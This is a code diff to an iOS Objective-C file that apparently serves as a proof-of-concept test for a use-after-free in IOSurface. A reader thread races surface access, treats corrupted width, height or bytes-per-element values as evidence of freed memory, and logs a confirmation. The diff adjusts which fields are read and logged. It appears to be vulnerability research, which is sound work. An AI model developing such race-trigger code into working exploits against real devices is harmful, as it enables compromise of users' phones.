@@ -19,7 +19,7 @@
 
 #import <UIKit/UIKit.h>
 #import <Metal/Metal.h>
-#import <IOSurface/IOSurface.h>
+#import <IOSurface/IOSurfaceRef.h>
 #import <WebKit/WebKit.h>
 #import <pthread.h>
 #import <stdatomic.h>
@@ -99,16 +99,15 @@ static void *reader_thread(void *arg) {
         if (!s) continue;
 
         /* Access surface from kernel side — if freed, this reads UAF memory */
-        uint32_t w = IOSurfaceGetWidth(s);
-        uint32_t h = IOSurfaceGetHeight(s);
-        uint32_t seed = IOSurfaceGetSeed(s);
-        IOSurfaceID sid = IOSurfaceGetID(s);
+        uint32_t w = (uint32_t)IOSurfaceGetWidth(s);
+        uint32_t h = (uint32_t)IOSurfaceGetHeight(s);
+        uint32_t bpe = (uint32_t)IOSurfaceGetBytesPerElement(s);
 
         /* Heuristic: if width/height is corrupted, UAF occurred */
-        if (w > 0x10000 || h > 0x10000 || w == 0 || h == 0) {
+        if (w > 0x10000 || h > 0x10000 || w == 0 || h == 0 || bpe == 0) {
             int hits = atomic_fetch_add(&g_hits, 1) + 1;
-            evf("UAF_INDICATOR it=%d idx=%d w=%u h=%u seed=%u sid=%u hits=%d",
-                it, idx, w, h, seed, (unsigned)sid, hits);
+            evf("UAF_INDICATOR it=%d idx=%d w=%u h=%u bpe=%u hits=%d",
+                it, idx, w, h, bpe, hits);
             if (hits >= 3) {
                 atomic_store(&g_stop, 1);
                 evf("UAF CONFIRMED after %d hits", hits);
@@ -171,7 +170,7 @@ static void run_uaf_test(void) {
             (__bridge NSString *)kIOSurfacePixelFormat: @(0x42475241),
         };
         surfs[i] = IOSurfaceCreate((__bridge CFDictionaryRef)props);
-        evf("surf[%d] id=%u ptr=%p", i, (unsigned)IOSurfaceGetID(surfs[i]), surfs[i]);
+        evf("surf[%d] w=%u ptr=%p", i, (unsigned)IOSurfaceGetWidth(surfs[i]), surfs[i]);
     }
 
     /* Initial texture creation to bind surfaces */
